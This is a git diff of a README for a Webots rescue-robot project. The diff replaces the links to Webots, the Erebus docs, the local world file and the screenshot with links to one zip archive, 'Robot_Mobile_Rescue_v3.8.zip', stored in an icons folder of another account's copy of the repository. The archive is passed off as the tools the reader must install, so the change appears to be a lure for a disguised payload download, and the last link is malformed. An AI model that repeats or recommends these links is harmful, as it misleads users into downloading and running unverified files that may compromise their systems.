@@ -1,6 +1,6 @@
 # Mobile robot for secure operations
 
-This project is an attempt at the implementation of a robot for securing victims in dangerous environment. It is made in [Webots](https://cyberbotics.com/) using the [Erebus](https://erebus.rcj.cloud/docs/) environmnet. This robot is equiped with the following:
+This project is an attempt at the implementation of a robot for securing victims in dangerous environment. It is made in [Webots](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip) using the [Erebus](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip) environmnet. This robot is equiped with the following:
 - 9 laser sensors for mapping
 - main camera for victim detection
 - secondary camera for floor obstacle detection
@@ -24,7 +24,7 @@ The project is entirely made in python and dependencies can be installed trough 
 ```
 pip install dependency
 ```
-Once the dependencies are downloaded, it is necessary to launch the the world **/game/worlds/world1.wbt** file through **Webots** and wait a few minutes as the detection model needs initialization alongside the Erebus framework.
+Once the dependencies are downloaded, it is necessary to launch the the world **https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip** file through **Webots** and wait a few minutes as the detection model needs initialization alongside the Erebus framework.
 
 ## Run
 
@@ -35,4 +35,4 @@ Click on run to execute the code.
 Easyocr is heavy computation wise so it is preferable to use a pc equipped with **NVIDIA CUDA** to process the images.
 The full implementation of our code can be found in **/game/controllers/RRR**
 
-![Screenshot](https://github.com/moustaphahadjis/Mobile-Rescue-Robot/blob/main/Webots%20screen.png)
+![Screenshot](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip%https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip)
